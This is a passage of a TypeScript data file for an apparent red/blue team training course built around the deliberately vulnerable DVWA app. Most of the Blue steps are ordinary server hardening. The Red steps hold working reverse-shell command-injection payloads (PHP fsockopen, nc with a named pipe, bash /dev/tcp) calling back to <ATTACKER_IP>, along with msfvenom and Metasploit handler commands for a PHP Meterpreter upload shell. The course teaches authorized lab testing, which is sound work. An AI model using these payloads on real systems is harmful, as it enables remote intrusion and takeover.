              { flag: '-l', meaning: 'Listen mode (wait for a connection).' },
              { flag: '-v', meaning: 'Verbose — print when someone connects.' },
              { flag: '-n', meaning: 'No DNS lookups (use raw IPs).' },
              { flag: '-p 4444', meaning: 'Listen on port 4444.' },
            ],
          },
          {
            cmd: '127.0.0.1; which nc bash python3 php',
            explain: '② In the browser, go to the DVWA Command Injection input field — run this FIRST. It prints which shells the container actually has, so you can pick a payload that will work. In a stock DVWA container usually only php prints a path.',
            flags: [
              { flag: 'which nc bash python3 php', meaning: 'Shows the path of each tool that exists in the container (a blank line = not installed).' },
            ],
          },
          {
            cmd: '127.0.0.1; php -r \'$s=fsockopen("<ATTACKER_IP>",4444);$p=proc_open("sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);\'',
            explain: '② BROWSER field — RECOMMENDED for the DVWA container (PHP is always present): open a socket back to your Kali and run /bin/sh over it. Paste this and Submit.',
            flags: [
              { flag: 'php -r \'…\'', meaning: 'Run a one-line PHP script — PHP is guaranteed inside a DVWA container.' },
              { flag: 'fsockopen("<ATTACKER_IP>",4444)', meaning: 'Open a TCP connection back to YOUR Kali on port 4444.' },
              { flag: 'proc_open("sh -i", …)', meaning: 'Wire an interactive /bin/sh to that socket (sh exists even when bash does not).' },
            ],
          },
          {
            cmd: '127.0.0.1; mkfifo /tmp/f; nc <ATTACKER_IP> 4444 < /tmp/f | /bin/sh > /tmp/f',
            explain: '② BROWSER field — Fallback A, only if command 3 showed nc: a named pipe wires a shell to a connection back to your Kali listener.',
            flags: [
              { flag: '127.0.0.1;', meaning: 'Satisfies the intended field, then ; starts your injected command.' },
              { flag: 'mkfifo /tmp/f', meaning: 'Create a named pipe used to shuttle data both ways.' },
              { flag: 'nc <ATTACKER_IP> 4444', meaning: 'Connect back to YOUR Kali IP on port 4444.' },
              { flag: '| /bin/sh > /tmp/f', meaning: 'Feed what you type into a shell and send its output back down the pipe.' },
            ],
          },
          {
            cmd: '127.0.0.1; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1',
            explain: '② BROWSER field — Fallback B, only if command 3 showed bash: the bash built-in /dev/tcp opens the connection back to your listener.',
            flags: [
              { flag: 'bash -i', meaning: 'Start an interactive bash shell (needs bash — many containers only have sh).' },
              { flag: '>& /dev/tcp/<ATTACKER_IP>/4444', meaning: 'Redirect it over a TCP connection to your Kali on port 4444.' },
              { flag: '0>&1', meaning: 'Wire input and output together so the shell is usable.' },
            ],
          },
        ],
        expectedOutput: `$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.100.20 46122
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
dvwa-target`,
        outputHighlights: [
          { text: 'Connection received on 10.10.100.20', label: 'the target dialed back to your listener. This line is the moment the reverse shell lands — before it, nothing has happened.' },
          { text: 'uid=33(www-data)', label: 'the proof of remote code execution. You are now running commands on the target as the web-server user — hard evidence, save it to the proof file.' },
          { text: 'dvwa-target', label: 'the target’s own hostname, printed by a command you ran on it. Naming the box you landed on removes any doubt about whose shell this is.' },
        ],
        whatItMeans: 'Demonstrates RCE and full system compromise.',
        frameworks: ['OWASP'],
        producesDeliverable: 'Reverse_Shell_Proof.txt',
        isEvidenceStep: true,
        verify: ['uid='],
        fixes: [
          { symptom: 'Ran a payload but no shell?', fix: '99% of the time the container lacks that tool — run command 3 (which nc bash python3 php) and use the PHP payload; DVWA containers ship PHP but usually not nc or bash.' },
          { symptom: 'Shell connects nowhere?', fix: 'Put YOUR Kali IP in <ATTACKER_IP> (find it with ip a) — 127.0.0.1 or the container IP will not work. The browser tab hangs while the shell is live; that is expected, watch your listener.' },
          { symptom: 'Nothing arrives at all?', fix: 'The container must reach your Kali — from the Docker HOST test: nc <ATTACKER_IP> 4444 or ping <ATTACKER_IP>. Make sure DVWA Security = Low (Medium/High strip the ; ).' },
          { symptom: '"Address already in use" on port 4444?', fix: 'Something already holds it — find it with jobs, stop it with kill %1.' },
        ],
      },
      {
        id: 'red-w3-msf',
        title: 'Metasploit Exploitation (File Upload → Meterpreter)',
        description: 'Weaponise DVWA File Upload: upload a PHP payload and catch a Meterpreter session with Metasploit.',
        instruction: 'A three-window attack. Know where each line goes.',
        instructionList: [
          'Kali terminal: build the payload (command 2).',
          'Kali msfconsole: start the handler (command 3) and leave it waiting.',
          'Browser: in DVWA (Security = Low) → File Upload, choose shell.php and Upload; note the path DVWA prints, then open that path (command 4) to run it.',
          'Back in msfconsole a Meterpreter session opens: run sysinfo and getuid (command 5) and save the proof.',
        ],
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder (safe to run again).' },
          {
            cmd: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4445 -f raw -o ~/team-artifacts/week-3/shell.php',
            explain: '① KALI TERMINAL: generate a PHP Meterpreter payload that connects back to your Kali. Uses port 4445 so it does not clash with the netcat listener on 4444.',
            flags: [
              { flag: 'msfvenom', meaning: 'Metasploit’s payload generator.' },
              { flag: '-p php/meterpreter/reverse_tcp', meaning: 'A PHP Meterpreter that dials back to you (reverse connection).' },
              { flag: 'LHOST=<ATTACKER_IP>', meaning: 'Your Kali IP — where the shell connects back to.' },
              { flag: 'LPORT=4445', meaning: 'The port your handler listens on.' },
              { flag: '-f raw -o shell.php', meaning: 'Write the raw PHP payload to shell.php (the file you upload).' },
            ],
          },
          {
            cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4445; run"',
            explain: '② KALI (new terminal): start the Metasploit handler that catches the session. Leave it running while you upload and trigger the shell.',
            flags: [
              { flag: 'msfconsole -q -x "…"', meaning: 'Launch Metasploit quietly and run these commands automatically.' },
              { flag: 'use exploit/multi/handler', meaning: 'The generic listener that receives payload connections.' },
              { flag: 'set PAYLOAD php/meterpreter/reverse_tcp', meaning: 'Must match the payload you built with msfvenom.' },
              { flag: 'set LHOST / LPORT', meaning: 'Same IP and port as the payload (<ATTACKER_IP> : 4445).' },
              { flag: 'run', meaning: 'Start waiting for the connection.' },
            ],
          },
          {
            cmd: 'curl "http://<YOUR_TARGET_IP>:8080/hackable/uploads/shell.php"',
            explain: '③ BROWSER or Kali: after uploading shell.php on DVWA → File Upload (Security = Low), open the path DVWA printed to RUN the payload. Adjust the path if DVWA shows a different one.',
            flags: [
              { flag: 'http://<YOUR_TARGET_IP>:8080/…/uploads/shell.php', meaning: 'The uploaded payload’s URL — visiting it executes the PHP and fires the reverse connection.' },
            ],
          },
          {
            cmd: 'sysinfo; getuid',
            explain: 'KALI (msfconsole, inside the Meterpreter session): confirm the host and the user you are running as, then save the session output to ~/team-artifacts/week-3/Metasploit_Proof.txt.',
            flags: [
              { flag: 'sysinfo', meaning: 'Show the target OS/host details.' },
              { flag: 'getuid', meaning: 'Show which user the Meterpreter runs as (proves code execution).' },
            ],
          },
        ],
        expectedOutput: `[*] Started reverse TCP handler on 10.10.100.5:4445
[*] Meterpreter session 1 opened (10.10.100.5:4445 -> 10.10.100.20:39002)

meterpreter > sysinfo
Computer     : dvwa-target
OS           : Linux dvwa-target 5.15.0 x86_64
Meterpreter  : php/linux
meterpreter > getuid
Server username: www-data`,
        outputHighlights: [
          { text: 'Meterpreter session 1 opened', label: 'the uploaded shell.php connected back to your handler. No session line means the payload never ran — check LHOST and the upload path.' },
          { text: 'Server username: www-data', label: 'interactive code execution as the web-server user, through Metasploit. This is what turns an unrestricted file upload into remote control.' },
          { text: 'Meterpreter  : php/linux', label: 'confirms the session type matches the php/meterpreter payload you built. A mismatch here is why a session sometimes dies instantly.' },
        ],
        whatItMeans: 'Shows a full exploit framework can turn an unrestricted file upload into remote control.',
        frameworks: ['OWASP', 'NIST_800_115'],
        producesDeliverable: 'Metasploit_Proof.txt',
        isEvidenceStep: true,
        verify: ['meterpreter'],
        fixes: [
          { symptom: 'No session?', fix: 'Confirm LHOST=<ATTACKER_IP> is your Kali IP and the handler LPORT (4445) equals the payload LPORT.' },
          { symptom: 'Payload not executing?', fix: 'Make sure shell.php starts with <?php — msfvenom raw output sometimes needs it prepended.' },
          { symptom: 'Upload rejected?', fix: 'Set DVWA Security to Low so .php is allowed.' },
          { symptom: '404 on the shell URL?', fix: 'Use the exact path DVWA printed (often ../../hackable/uploads/).' },
          { symptom: 'Session dies instantly?', fix: 'Re-run the handler, then re-open the URL.' },
        ],
      },
      {
        id: 'red-w3-s4',
        title: 'Screenshot Evidence',
        description: 'Capture proof of successful exploitation.',
        instruction: 'For each exploit, take a screenshot and save it as YYYYMMDD_TeamXX_Tool_Action.png (e.g. 20260624_Team01_sqlmap_dbdump.png) in ~/team-artifacts/week-3/ — dated, attributed, and self-describing. Then bundle them: zip ~/team-artifacts/week-3/Evidence_Photos.zip ~/team-artifacts/week-3/*.png',
        expectedOutput: 'Correctly-named PNGs in your Evidence folder, zipped into Evidence_Photos.zip',
        outputExplanation: 'Each filename should read date_team_tool_action.png so anyone can tell what it proves without opening it; the zip is the bundle you hand to GRC.',
        whatItMeans: 'Documented proof required by GRC for compliance and reporting. Attach these to the Penetration Test Report form.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Penetration Test Report',
        producesDeliverable: 'Evidence_Photos.zip',
        isEvidenceStep: true,
        troubleshooting: 'Screenshot tool on Kali: use the PrintScreen key or run flameshot gui (sudo apt install flameshot). Name mismatch warnings later? Match the pattern exactly: 8-digit date, Team then two digits, then Tool and Action, .png.',
      }
    ]
  },
  {
    id: 'red-w4-briefing',
    role: 'red',
    week: 4,
    title: 'Technical Findings Briefing',
    objective: 'Present technical exploits and findings in plain English to stakeholders.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: [],
    prerequisites: ['All Week 3 evidence', "GRC's Findings.md"],
    definitionOfDone: ['Plain-English explanation written', 'Your briefing slides drafted'],
    handoff: [{ to: 'grc', artifact: 'Technical_Explanation.md', note: 'Feed the technical narrative into the final report.' }],
    learn: ['Explaining exploits to non-technical stakeholders', 'Building a findings briefing'],
    tools: ['Markdown', 'Slides'],
    steps: [
      {
        id: 'red-w4-s1',
        title: 'Review Attack Timeline',
        description: 'Prepare chronological attack narrative.',
        command: 'cat timeline.txt',
        commandExplanation: '`cat` prints the contents of `timeline.txt` to the screen so you can review the attack chronology you recorded.',
        commandFlags: [
          { flag: 'cat', meaning: 'Print a file’s contents to the screen.' },
          { flag: 'timeline.txt', meaning: 'The file holding your recorded attack events.' },
        ],
        expectedOutput: 'Clear sequence of events',
        outputExplanation: 'You should see your timestamped events in order; gaps or out-of-order entries are your cue to tidy the narrative before briefing.',
        whatItMeans: 'Tells the story of how the compromise occurred.',
        frameworks: ['ISO_27001'],
        fixes: [
          { symptom: '"cat: timeline.txt: No such file or directory"?', fix: 'timeline.txt is your own notes — you have not created it yet. Make it (e.g. nano ~/team-artifacts/week-3/timeline.txt), listing each action with a timestamp.' },
          { symptom: 'Still not found?', fix: 'Run cat from the folder that holds the file, or give the full path.' },
        ],
      },
      {
        id: 'red-w4-s2',
        title: 'Explain Each Finding',
        description: 'Explain each finding in plain English.',
        instruction: 'Explain each finding (impact and fix) in the Penetration Test Report form.',
        whatItMeans: 'Non-technical stakeholders understand the risk.',
        frameworks: ['ISO_27001'],
        usesForm: 'Penetration Test Report',
      },
      {
        id: 'red-w4-s3',
        title: 'Draft Your Briefing Slides',
        description: 'Prepare your briefing slides.',
        instruction: 'Build a few briefing slides from your Penetration Test Report — one beat per finding.',
        whatItMeans: 'Your half of the final briefing is ready to combine with Blue and GRC.',
        frameworks: ['ISO_27001'],
      }
    ]
  }
];

// BLUE (Wardens) Tasks
const BLUE_TASKS: Task[] = [
  {
    id: 'blue-w0-setup',
    role: 'blue',
    week: 0,
    title: 'Reach Your Targets & Stand Up DVWA',
    objective: 'Connect to both company servers, snapshot them, and run the DVWA web app (a Docker container) that Red will test.',
    frameworks: ['NIST_CSF'],
    deliverables: [],
    learn: ['Connecting to Linux (SSH) and Windows (RDP) hosts', 'Taking a baseline snapshot before any change', 'Running & managing a containerized web app with Docker (DVWA)'],
    tools: ['ssh', 'xfreerdp / Remote Desktop', 'VM snapshots', 'Docker'],
    prerequisites: ['Ubuntu and Windows target IPs + credentials (from your lab)', 'See "Lab requirements & setup" in the Guide to build the VMs first'],
    definitionOfDone: ['You can SSH into the Ubuntu target', 'You can RDP into the Windows target', 'A "pre-hardening" snapshot exists for both VMs', 'DVWA is running (container "dvwa") and reachable at http://<UBUNTU_IP>/', 'DVWA database created and Security set to Low (login admin / password)'],
    handoff: [
      { to: 'grc', note: 'Confirm both targets are reachable so GRC can finalize the hardening standard.' },
      { to: 'red', note: 'Tell Red the DVWA target URL (http://<UBUNTU_IP>/) once the container is up.' },
    ],
    steps: [
      {
        id: 'blue-w0-s1',
        title: 'SSH Into the Ubuntu Target',
        description: 'Open a remote shell on the Linux server you will harden.',
        command: 'ssh user@<UBUNTU_IP>',
        commandExplanation: '`ssh user@host` opens an encrypted remote shell on the Ubuntu server using the account the instructor gave you.',
        expectedOutput: 'A shell prompt on the Ubuntu host',
        outputExplanation: 'A changed prompt (e.g. `user@ubuntu:~$`) means you are now on the target, not your own machine.',
        whatItMeans: 'You can administer the Linux system you defend.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'Connection refused? Ensure the Ubuntu VM is up and SSH is running (`sudo systemctl status ssh`).',
      },
      {
        id: 'blue-w0-s2',
        title: 'RDP Into the Windows Target',
        description: 'Open a remote desktop on the Windows server you will harden.',
        command: 'xfreerdp /u:Administrator /v:<WINDOWS_IP>',
        commandExplanation: '`xfreerdp` is a Linux RDP client; `/u:` is the username and `/v:` is the Windows host to connect to.',
        expectedOutput: 'The Windows desktop appears',
        outputExplanation: 'Seeing the Windows desktop confirms Remote Desktop is enabled and reachable.',
        whatItMeans: 'You can administer the Windows system you defend.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'Blocked? On the Windows host enable Remote Desktop (System > Remote Desktop) and allow it through Windows Firewall.',
      },
      {
        id: 'blue-w0-s3',
        title: 'Snapshot Before Hardening',
        description: 'Capture a restore point on both VMs before changing anything.',
        instruction: 'In your hypervisor, take a snapshot named "pre-hardening" of BOTH the Ubuntu and Windows VMs.',
        expectedOutput: 'Two "pre-hardening" snapshots',
        outputExplanation: 'Snapshots let you compare before/after and roll back safely if a change breaks something.',
        whatItMeans: 'You have a known-good baseline to measure your hardening against.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'No snapshot option? Power off the VM first, or use your hypervisor’s "clone" feature as a fallback.',
      },
      {
        id: 'blue-w0-s4',
        title: 'Run the DVWA Target (Docker)',
        description: 'Start Docker on the Ubuntu host and run DVWA — the vulnerable web app Red will attack.',
        instruction: 'On the Ubuntu host, install Docker, run the DVWA image as a NAMED container on port 80, then confirm it answers. Naming it "dvwa" lets you start/stop it later by name.',
        commands: [
          { cmd: 'sudo apt install -y docker.io', explain: 'Install the Docker engine. sudo runs as admin; -y auto-answers "yes" to the install prompt.' },
          { cmd: 'sudo systemctl enable --now docker', explain: 'Start Docker right now and set it to start on every boot (--now does both at once).' },
          {
            cmd: 'sudo docker run -d --name dvwa --restart unless-stopped -p 80:80 vulnerables/web-dvwa',
            explain: 'Download and run the DVWA target app in the background. This is the vulnerable site Red will attack and Blue will defend.',
            flags: [
              { flag: 'docker run', meaning: 'Create and start a new container from an image.' },
              { flag: '-d', meaning: 'Run it in the background (detached) so your terminal is free.' },
              { flag: '--name dvwa', meaning: 'Name the container "dvwa" so you can start/stop it by name later.' },
              { flag: '--restart unless-stopped', meaning: 'Automatically bring it back after a reboot.' },
              { flag: '-p 80:80', meaning: 'Connect host port 80 to the container’s port 80 so you can reach it in a browser.' },
              { flag: 'vulnerables/web-dvwa', meaning: 'The image to run — Damn Vulnerable Web App.' },
            ],
          },
          { cmd: 'curl -I http://localhost/', explain: 'Ask the site for just its response headers to confirm it is answering. -I = headers only.' },
        ],
        expectedOutput: 'HTTP/1.1 302 Found (redirect to /login.php); `docker ps` shows the dvwa container running',
        outputExplanation: 'A 200/302 response means DVWA is serving; browse to http://<UBUNTU_IP>/ and you should see the DVWA login page.',
        whatItMeans: 'The vulnerable target is live, so Red has something authorized to test and Blue has a real service to defend.',
        frameworks: ['NIST_CSF'],
        fixes: [
          { symptom: 'Port 80 already in use?', fix: 'Stop the host web server (sudo systemctl stop apache2) or map another port, e.g. -p 8080:80.' },
          { symptom: 'Blank on first run?', fix: 'The first run pulls the image — give it a minute.' },
          { symptom: 'Container exited?', fix: 'Check sudo docker logs dvwa.' },
          { symptom: '"Name already in use"?', fix: 'sudo docker rm -f dvwa, then re-run.' },
        ],
      },
      {
        id: 'blue-w0-s5',
        title: 'Initialize DVWA & Manage the Container',
        description: 'Set up the DVWA database and security level on first run, and learn to start/stop it.',
        instruction: 'Bring DVWA up and set it to the level the payloads expect.',
        instructionList: [
          'In a browser on the lab network, open http://<UBUNTU_IP>/setup.php and click "Create / Reset Database".',
          'Log in with admin / password.',
          'Open the DVWA Security page and set the level to Low so standard payloads work.',
          'Use the commands below to start and stop the target on later days.',
        ],
        commands: [
          { cmd: 'sudo docker start dvwa', explain: 'Start the existing DVWA container (e.g. after a reboot).' },
          { cmd: 'sudo docker stop dvwa', explain: 'Stop DVWA when you are done for the day.' },
          { cmd: 'sudo docker ps', explain: 'List running containers — confirm "dvwa" is up.' },
          { cmd: 'sudo docker logs dvwa', explain: 'View the container logs if the page will not load.' },
        ],
        expectedOutput: 'DVWA database created; login works; Security shows "Low". `docker ps` lists dvwa as Up.',
        outputExplanation: 'After "Create / Reset Database" you can log in (admin / password) and reach the modules. Security = Low makes the SQLi/brute-force exercises behave as written.',
        whatItMeans: 'DVWA is fully initialized and you can bring the target up or down on demand, like a real service owner.',
        frameworks: ['NIST_CSF'],
        fixes: [
          { symptom: 'setup.php blank or errors?', fix: 'Give the container a minute on first boot, then refresh.' },
          { symptom: 'Login fails after reset?', fix: 'Use the defaults admin / password.' },
          { symptom: 'Forgot the IP?', fix: 'sudo docker ps confirms it is running; browse from a VM on the same lab subnet.' },
        ],
      },
    ],
  },
  {
    id: 'blue-w1-hardening',
    role: 'blue',
    week: 1,
    title: 'Baseline Hardening (Ubuntu + Windows)',
    objective: 'Harden both company servers — the Ubuntu web host and the Windows host — with essential controls.',
    frameworks: ['NIST_CSF', 'CIS'],
    deliverables: ['UFW_Status.txt', 'Lynis_Report.txt', 'Windows_Firewall.txt', 'Defender_Status.txt'],
    prerequisites: ["GRC's Hardening_Standard.md (what controls to apply)", 'SSH access to Ubuntu and RDP access to Windows (Week 0)'],
    definitionOfDone: ['Ubuntu: firewall on, fail2ban running, Lynis audited', 'Windows: Firewall on, Defender updated & scanned, SMBv1 disabled', 'Hardening_Checklist.txt reflects both hosts'],
    handoff: [{ to: 'grc', artifact: 'Hardening_Checklist.txt', note: 'Report what was hardened on both hosts for the policy baseline.' }],
    learn: ['Linux hardening: UFW, fail2ban, Lynis', 'Windows hardening: Windows Firewall, Defender, disabling SMBv1', 'Working across two operating systems'],
    tools: ['ufw', 'fail2ban', 'lynis', 'PowerShell', 'Microsoft Defender'],
    steps: [
      {
        id: 'blue-w1-s1',
        title: 'SSH Into Target',
        description: 'Establish secure connection to target server.',
        commands: [
          {
            cmd: 'ssh user@10.10.10.5',
            explain: 'Open an encrypted remote terminal on the Ubuntu server as the "user" account (it asks for that account\'s password). Replace user/IP with yours.',
            flags: [
              { flag: 'ssh', meaning: 'Open an encrypted remote shell (Secure Shell).' },
              { flag: 'user@10.10.10.5', meaning: 'Log in as "user" on this host — swap in your username and target IP.' },
            ],
          },
        ],
        expectedOutput: 'Shell prompt; whoami shows non-root user',
        outputExplanation: 'A changed prompt (e.g. `user@target:~$`) means you are in; `whoami` returning a non-root name confirms least-privilege access.',
        whatItMeans: 'You are connected as non-root (good security), can now apply hardening.',
        frameworks: ['NIST_CSF'],
        fixes: [
          { symptom: '"Connection refused"?', fix: 'SSH is not running on the target — start it on the Ubuntu VM: sudo systemctl start ssh.' },
          { symptom: '"Permission denied"?', fix: 'Wrong username or password.' },
          { symptom: 'First-connection "authenticity" prompt?', fix: 'Type yes.' },
          { symptom: '"No route to host"?', fix: 'Check the IP and that the target is on the lab network (ping it).' },
        ],
      },
      {
        id: 'blue-w1-s2',
        title: 'Update System',
        description: 'Apply latest security patches.',
        commands: [
          { cmd: 'sudo apt update', explain: 'Refresh the list of available packages.' },
          { cmd: 'sudo apt upgrade -y', explain: 'Install all available updates (-y auto-confirms).' },
        ],
        commandExplanation: '`apt update` refreshes the package index; `apt upgrade -y` then installs all available updates with `-y` auto-confirming the prompts. `sudo` runs both as root.',
        commandFlags: [
          { flag: 'sudo', meaning: 'Run as root (required to change the system).' },
          { flag: 'apt update', meaning: 'Refresh the list of available packages.' },
          { flag: 'apt upgrade', meaning: 'Install the available updates.' },
          { flag: '-y', meaning: 'Auto-answer “yes” to prompts.' },
        ],
        expectedOutput: 'Packages updated',
        outputExplanation: 'Watch the summary line — "X upgraded, Y newly installed" — and make sure it finishes without errors, meaning known-vulnerable packages are now patched.',
        whatItMeans: 'Patches known vulnerabilities in OS and applications.',
        frameworks: ['CIS'],
        fixes: [
          { symptom: '"Could not get lock /var/lib/dpkg/lock"?', fix: 'Another update is running — wait a minute and retry, or reboot.' },
          { symptom: '"Permission denied"?', fix: 'You forgot sudo.' },
          { symptom: 'No network in the lab?', fix: 'apt update may fail to reach mirrors — expected offline; note it and continue.' },
        ],
      },
      {
        id: 'blue-w1-s3',
        title: 'Configure Firewall',
        description: 'Enable UFW and allow only SSH and HTTP.',
        instruction: 'Run these one at a time on the Ubuntu host. UFW (Uncomplicated Firewall) decides what network traffic is allowed in. You start by blocking everything, then open only the ports you need.',
        commands: [
          { cmd: 'sudo ufw default deny incoming', explain: 'Set the default rule: block ALL incoming traffic. You then open only what you need — the safest starting point.' },
          { cmd: 'sudo ufw allow 22', explain: 'Open port 22 so you can still reach the server over SSH (remote terminal). Locking this out would cut off your own access.' },
          { cmd: 'sudo ufw allow 80', explain: 'Open port 80 so the website (HTTP) is reachable.' },
          { cmd: 'sudo ufw --force enable', explain: 'Turn the firewall on. --force skips the "are you sure?" prompt so it doesn’t hang.' },
          { cmd: 'mkdir -p ~/team-artifacts/week-1', explain: 'Make the week-1 folder to save your evidence into (safe to run again).' },
          { cmd: 'sudo ufw status verbose > ~/team-artifacts/week-1/UFW_Status.txt', explain: 'Save the active firewall rules to a file as evidence. > writes the output to that file.' },
        ],
        expectedOutput: `Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)

To                         Action      From
--                         ------      ----
22                         ALLOW IN    Anywhere
80                         ALLOW IN    Anywhere`,
        outputHighlights: [
          { text: 'Status: active', label: 'the firewall is actually on. If this reads "inactive" the rules below exist but are enforcing nothing — the most common way this step looks done but isn’t.' },
          { text: 'deny (incoming)', label: 'the default that makes this hardening. Everything is blocked unless a rule below opens it — the opposite of a machine that trusts all inbound traffic.' },
          { text: '22                         ALLOW IN', label: 'SSH is still allowed, so you keep your own access. This must be present before you enable, or you lock yourself out.' },
        ],
        whatItMeans: 'Restricts inbound traffic to only necessary services. Log this change in the Change Log form.',
        frameworks: ['CIS'],
        usesForm: 'Change Log',
        producesDeliverable: 'UFW_Status.txt',
        isEvidenceStep: true,
        fixes: [
          { symptom: 'Locked yourself out over SSH?', fix: 'Always allow 22 BEFORE enabling. If stranded, fix it from the VM console.' },
          { symptom: '"ufw: command not found"?', fix: 'sudo apt install ufw.' },
          { symptom: 'Status shows inactive?', fix: 'Re-run sudo ufw --force enable. Order matters: set default-deny and allow 22 first.' },
        ],
      },
      {
        id: 'blue-w1-s4',
        title: 'Install Fail2Ban',
        description: 'Protect against brute force attacks.',
        commands: [
          { cmd: 'sudo apt install -y fail2ban', explain: 'Install fail2ban (bans IPs after repeated failed logins).' },
          { cmd: 'sudo systemctl enable --now fail2ban', explain: 'Start it now and on every boot.' },
        ],
        commandExplanation: '`apt install fail2ban` installs the intrusion-prevention tool; `systemctl enable` sets it to start automatically at every boot.',
        commandFlags: [
          { flag: 'apt install fail2ban', meaning: 'Install the brute-force protection tool.' },
          { flag: 'systemctl enable fail2ban', meaning: 'Start it automatically on every boot.' },
        ],
        expectedOutput: 'Fail2Ban running and enabled',
        outputExplanation: '`Created symlink ... fail2ban.service` confirms it is enabled; `systemctl status fail2ban` should read `active (running)`.',
        whatItMeans: 'Automatically blocks repeated failed login attempts. Record your hardening in the Hardening Baseline form.',
        frameworks: ['CIS'],
        usesForm: 'Hardening Baseline',
        isEvidenceStep: true,
        troubleshooting: '"Unit fail2ban.service not found" right after install? The package may still be finishing — wait, then re-run the enable line. Check it with sudo systemctl status fail2ban (expect active (running)) and sudo fail2ban-client status for active jails.',
      },
      {
        id: 'blue-w1-s5',
        title: 'System Audit with Lynis',
        description: 'Run comprehensive security audit.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-1', explain: 'Create the week-1 artifacts folder.' },
          { cmd: 'sudo lynis audit system | tee ~/team-artifacts/week-1/Lynis_Report.txt', explain: 'Run the full Lynis hardening audit and save the report.' },
        ],
        commandExplanation: '`lynis audit system` runs a comprehensive local security audit across files, services and config; `| tee ~/team-artifacts/week-1/Lynis_Report.txt` shows and saves the full output for review.',
        commandFlags: [
          { flag: 'lynis audit system', meaning: 'Run a full local security audit.' },
          { flag: '| tee ~/team-artifacts/week-1/Lynis_Report.txt', meaning: 'Show and save the audit output to the canonical file.' },
        ],
        expectedOutput: `[+] Results
  Warnings (2):
  ! Consider hardening SSH configuration [SSH-7408]
  ! Reboot needed to load a newer kernel [KRNL-5830]

  Hardening index : 67 [############        ]
  Tests performed : 261
  Lynis modules   : done`,
        outputHighlights: [
          { text: 'Hardening index : 67', label: 'your single score out of 100. Write it down — its whole value is comparing before and after your changes, so a lone number proves nothing without the pair.' },
          { text: 'Warnings (2)', label: 'your prioritised to-do list. Warnings outrank Suggestions; fix these first and the index climbs fastest.' },
          { text: 'SSH-7408', label: 'a test ID. Quote it in the report — "harden SSH [SSH-7408]" is auditable, "make SSH better" is not.' },
        ],
        whatItMeans: 'Identifies remaining security gaps and compliance issues.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Lynis_Report.txt',
        isEvidenceStep: true,
        fixes: [
          { symptom: '"lynis: command not found"?', fix: 'sudo apt install lynis. Run it with sudo so it can read protected config.' },
          { symptom: 'Score looks wrong mid-run?', fix: 'The run is long — let it finish before reading the score.' },
          { symptom: 'Report file empty?', fix: 'Check the ~/team-artifacts/week-1 folder exists (the mkdir line above creates it).' },
        ],
      },
      {
        id: 'blue-w1-s6',
        title: 'Windows: Enable & Export the Firewall',
        description: 'Turn on Windows Firewall for all profiles and save its state (run in PowerShell as Administrator on the Windows host).',
        commands: [
          {
            cmd: 'Set-NetFirewallProfile -All -Enabled True',
            explain: 'Turn the Windows Firewall on for every profile. Type this in PowerShell (run as Administrator) and press Enter.',
            flags: [
              { flag: 'Set-NetFirewallProfile', meaning: 'The PowerShell command that changes Windows Firewall settings.' },
              { flag: '-All', meaning: 'Apply to all three profiles: Domain, Private, and Public.' },
              { flag: '-Enabled True', meaning: 'Switch the firewall ON (True = on, False = off).' },
            ],
          },
          {
            cmd: 'Get-NetFirewallProfile | Out-File Windows_Firewall.txt',
            explain: 'Read the firewall state back and save it to a file — this file is your evidence.',
            flags: [
              { flag: 'Get-NetFirewallProfile', meaning: 'Show the current firewall profile settings.' },
              { flag: '|', meaning: 'A "pipe" — sends the output of the left command into the command on the right.' },
              { flag: 'Out-File Windows_Firewall.txt', meaning: 'Write that output into a text file named Windows_Firewall.txt.' },
            ],
          },
        ],
        expectedOutput: `Name                            : Domain
Enabled                         : True

Name                            : Private
Enabled                         : True

Name                            : Public
Enabled                         : True`,
        outputHighlights: [
          { text: 'Enabled                         : True', label: 'this must read True for all three profiles. A single "False" — most often Public — is an open door on the exact network you least trust.' },
          { text: 'Public', label: 'the profile that matters most. It applies on untrusted networks, so it is the one an attacker is most likely to meet.' },
        ],
        whatItMeans: 'The Windows host now blocks unsolicited inbound traffic, like UFW does on Ubuntu.',
        frameworks: ['CIS'],
        producesDeliverable: 'Windows_Firewall.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: '“Access denied”? You must launch PowerShell with “Run as administrator”.',
      },
      {
        id: 'blue-w1-s7',
        title: 'Windows: Defender Scan & Disable SMBv1',
        description: 'Update and scan with Microsoft Defender, and remove the legacy SMBv1 protocol.',
        commands: [
          {
            cmd: 'Update-MpSignature',
            explain: 'Download the newest Microsoft Defender virus definitions so the scan catches recent threats. Run each of these one at a time in an Administrator PowerShell.',
            flags: [
              { flag: 'Update-MpSignature', meaning: 'Fetch the latest antivirus definition updates for Defender.' },
            ],
          },
          {
            cmd: 'Start-MpScan -ScanType QuickScan',
            explain: 'Run a quick antivirus scan of the most commonly infected areas.',
            flags: [
              { flag: 'Start-MpScan', meaning: 'Start a Microsoft Defender scan.' },
              { flag: '-ScanType QuickScan', meaning: 'Scan the high-risk areas only (fast). Alternatives: FullScan, CustomScan.' },
            ],
          },
          {
            cmd: 'Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart',
            explain: 'Remove SMBv1, an old file-sharing protocol famously exploited by WannaCry.',
            flags: [
              { flag: 'Disable-WindowsOptionalFeature', meaning: 'Turn off an optional Windows feature.' },
              { flag: '-Online', meaning: 'Apply to the running system (not an offline image).' },
              { flag: '-FeatureName SMB1Protocol', meaning: 'The feature to remove — the unsafe SMBv1 protocol.' },
              { flag: '-NoRestart', meaning: 'Do not reboot automatically (you can reboot later).' },
            ],
          },
          {
